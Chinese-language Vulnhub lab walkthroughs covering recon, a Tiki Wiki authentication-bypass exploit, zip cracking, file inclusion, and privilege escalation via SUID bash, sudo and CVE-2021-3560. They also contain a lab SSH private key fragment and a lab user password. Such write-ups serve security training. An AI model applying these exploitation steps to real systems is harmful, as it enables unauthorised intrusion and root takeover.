bjZil47pkNbV70JWmnxixY31KjrDKldXgkzLJRoDfYp1Vu+sETVlW7tVcBm5MZmQO1iApD
gUMzlvFqiDNLFKUJdTj7fqyOAXDgkv8QksNmExKoBAjGnM9u8rRAyj5PNo1wAWKpCLxIY3
BhdlneNaAXDV/cKGFvW1aOMlGCeaJ0DxSAwG5Jys4Ki6kJ5EkfWo8elsUWF30wQkW9yjIP
UF5Fq6udJPnmEWApvLt62IeTvFqg+tPtGnVPleO3lvnCBBIxf8vBk8WtoJVJdJt3hO8c4j
kMtXsvLgRlve1bZUZX5MymHalN/LA1IsoC4Ykg/pMg3s9cYRRkm+GxiUU5bv9ezwM4Bmko
QPvyUcye28zwkO6tgVMZx4osrIoN9WtDUUdbdmD2UBZ2n3CZMkOV9XJxeju51kH1fs8q39
QXfxdNhBb3Yr2RjCFULDxhwDSIHzG7gfJEDaWYcOkNkIaHHgaV7kxzypYcqLrs0S7C4QAA
AMEAhdmD7Qu5trtBF3mgfcdqpZOq6+tW6hkmR0hZNX5Z6fnedUx//QY5swKAEvgNCKK8Sm
iFXlYfgH6K/5UnZngEbjMQMTdOOlkbrgpMYih+ZgyvK1LoOTyMvVgT5LMgjJGsaQ5393M2
yUEiSXer7q90N6VHYXDJhUWX2V3QMcCqptSCS1bSqvkmNvhQXMAaAS8AJw19qXWXim15Sp
WoqdjoSWEJxKeFTwUW7WOiYC2Fv5ds3cYOR8RorbmGnzdiZgxZAAAAwQDhNXKmS0oVMdDy
3fKZgTuwr8My5Hyl5jra6owj/5rJMUX6sjZEigZa96EjcevZJyGTF2uV77AQ2Rqwnbb2Gl
jdLkc0Yt9ubqSikd5f8AkZlZBsCIrvuDQZCoxZBGuD2DUWzOgKMlfxvFBNQF+LWFgtbrSP
OgB4ihdPC1+6FdSjQJ77f1bNGHmn0amoiuJjlUOOPL1cIPzt0hzERLj2qv9DUelTOUranO
cUWrPgrzVGT+QvkkjGJFX+r8tGWCAOQRUAAADBAM0cRhDowOFx50HkE+HMIJ2jQIefvwpm
Bn2FN6kw4GLZiVcqUT6aY68njLihtDpeeSzopSjyKh10bNwRS0DAILscWg6xc/R8yueAeI
Rcw85udkhNVWperg4OsiFZMpwKqcMlt8i6lVmoUBjRtBD4g5MYWRANO0Nj9VWMTbW9RLiR
kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```

这里发现权限不够，修改权限为`600`

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# ssh -i rsa oscp@192.168.231.139     
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "rsa": bad permissions
oscp@192.168.231.139: Permission denied (publickey).
```

成功登录！

![image-20230903225111546](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230903225111546.png)

## 3. 提权

刚开始尝试使用`sudo -l` 查看可利用工具，但是`sudo`被禁用，查找拥有`suid`权限的文件

`-perm`：指定要搜索的文件权限

`-type`：指定要搜索的文件类型

搜索拥有`suid`权限的文件

```bash
-bash-5.0$ find / -perm -u=s -type f 2>/dev/null 
/snap/snapd/7264/usr/lib/snapd/snap-confine
/snap/snapd/8140/usr/lib/snapd/snap-confine
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
/snap/core18/1754/bin/mount
/snap/core18/1754/bin/ping
/snap/core18/1754/bin/su
/snap/core18/1754/bin/umount
/snap/core18/1754/usr/bin/chfn
/snap/core18/1754/usr/bin/chsh
/snap/core18/1754/usr/bin/gpasswd
/snap/core18/1754/usr/bin/newgrp
/snap/core18/1754/usr/bin/passwd
/snap/core18/1754/usr/bin/sudo
/snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1754/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
# 这里发现一个 bash，尝试提权使用
/usr/bin/bash
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
```

由于`/usr/bin/bash`拥有`suid`权限，所以直接使用`-p`开启一个带有`root`权限的`bash`

```bash
# 提权成功
-bash-5.0$ /usr/bin/bash -p
bash-5.0# whoami
root
```

# Vulnhub 靶场 Tiki

## 1. 信息搜集

**1.1 局域网扫描**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fb:4a:01, IPv4: 192.168.231.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.231.1   00:50:56:c0:00:08       VMware, Inc.
192.168.231.2   00:50:56:e1:0e:4f       VMware, Inc.
# 目标主机
192.168.231.140 00:0c:29:2c:40:48       VMware, Inc.
192.168.231.254 00:50:56:f4:af:6c       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.894 seconds (135.16 hosts/sec). 4 responded
```

**1.2 nmap扫描**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# nmap -T4 -sV -p- -A -Pn 192.168.231.140
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-04 15:20 CST
Nmap scan report for 192.168.231.140
Host is up (0.0026s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)
|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)
|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/tiki/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

**1.3 目录爆破**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# gobuster dir -u "http://192.168.231.140/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.140/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 42]
# 发现一个 tiki 博客
/tiki                 (Status: 301) [Size: 317] [--> http://192.168.231.140/tiki/]
/server-status        (Status: 403) [Size: 280]
Progress: 220561 / 220562 (100.00%)
===============================================================
Finished
===============================================================

```

## 2. 外围打点

首先是发现一个`Tiki`中间件，进去查看，很轻易的就能找到一个管理员登录口

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904181505215.png" alt="image-20230904181505215" style="zoom:50%;" />

对于`Tiki`中间件，有一个未授权访问漏洞

![image-20230904181613803](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904181613803.png)

下载`POC`代码

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# searchsploit -m 48927.py
  Exploit: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/48927
     Path: /usr/share/exploitdb/exploits/php/webapps/48927.py
File Type: Python script, Unicode text, UTF-8 text executable

Copied to: /home/pinginglab/48927.py

```

运行`POC`代码，并使用BP转包删除提交的管理员密码

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# python3 48927.py 192.168.231.140
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
```

![image-20230904181853541](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904181853541.png)

成功进入后台

![image-20230904181907224](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904181907224.png)

发现一个用户的账号密码！

![image-20230904181949127](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904181949127.png)

![image-20230904181957196](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904181957196.png)

SSH连接

![image-20230904182046716](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904182046716.png)

## 3. 提权

直接通过FTP将工具下载到靶机上面，并运行查找提权方法

```bash
ftp> get lse.sh
local: lse.sh remote: lse.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lse.sh (54352 bytes).
226 Transfer complete.
54352 bytes received in 0.00 secs (24.7536 MB/s)
```

这里我们是有用户密码的，记得输入！

```bash
silky@ubuntu:~$ sh lse.sh 
---
If you know the current user password, write it here to check sudo privileges: Agy8Y7SPJNXQzqA   
```

这里显示可以不用密码登录

![image-20230904184207455](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904184207455.png)

联合`sudo`命令且我们知道了密码，所以直接`sudo su`提权

```bash
silky@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null |grep "/usr/bin"
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
# su 命令是有SUID权限的
/usr/bin/su
/usr/bin/vmware-user-suid-wrapper
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo

silky@ubuntu:~$ sudo su
[sudo] Passwort für silky: 
root@ubuntu:/home/silky# 
```

# vulnhub 靶场 drippingblues

## 1. 信息搜集

**1.1 局域网扫描**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/ctfTools/vesting]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fb:4a:01, IPv4: 192.168.231.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.231.1   00:50:56:c0:00:08       VMware, Inc.
192.168.231.2   00:50:56:e1:0e:4f       VMware, Inc.
192.168.231.141 00:0c:29:6c:93:b1       VMware, Inc.
192.168.231.254 00:50:56:f6:ab:69       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.962 seconds (130.48 hosts/sec). 4 responded

```

**1.2 nmap扫描**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/ctfTools/vesting]
└─# nmap -T4 -sV -p- -A -Pn 192.168.231.141
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-04 22:14 CST
Nmap scan report for 192.168.231.141
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
# 这里发现了FTP服务，且允许匿名登录
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.231.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/dripisreal.txt /etc/dripispowerful.html
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)

```

**1.3 目录爆破**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/ctfTools/vesting]
└─# gobuster dir -u "http://192.168.231.141/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.141/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 78]
/server-status        (Status: 403) [Size: 280]
Progress: 220561 / 220562 (100.00%)
===============================================================
Finished
===============================================================

```

**1.4 获取FTP文件**

![image-20230904223805741](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904223805741.png)

**1.5 尝试解压缩文件**

存在密码

![image-20230904223908359](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904223908359.png)

**1.6 爆破压缩文件**

拿到字符串：`drip`，但是不知道有什么用

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/test]
└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip 


PASSWORD FOUND!!!!: pw == 072528035

```

**1.7 访问robots.txt**

发现两个可疑文件！

![image-20230904224114808](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904224114808.png)

这个其实是一个干扰项，当时卡在这里好久，还做了个字符统计，但是都不对

![image-20230904224134762](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904224134762.png)

剩下一个无法直接访问

![image-20230904224222640](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904224222640.png)

偷瞄一下答案，发现可以用`drip`做文件包含漏洞，这里的用户`thugger`是可以登录的

![image-20230904224430271](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904224430271.png)

再访问刚刚无法访问的网页，访问成功！并发现密码

![image-20230904224751654](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904224751654.png)

![image-20230904225303793](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904225303793.png)

## 3. 提权

使用`ps aux`查看当前运行程序，发现`python`在运行

![image-20230904225923421](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904225923421.png)

直接使用`FTP`来下载提权扫描工具，扫描提权方法和漏洞

![image-20230904225654254](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904225654254.png)

这里直接将扫到的漏洞编号丢到Github上面找POC代码，然后使用`wget`命令下载，然后逐个逐个试，最后发现漏洞`CVE-2021-3560`提权成功

![image-20230904230045315](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230904230045315.png)

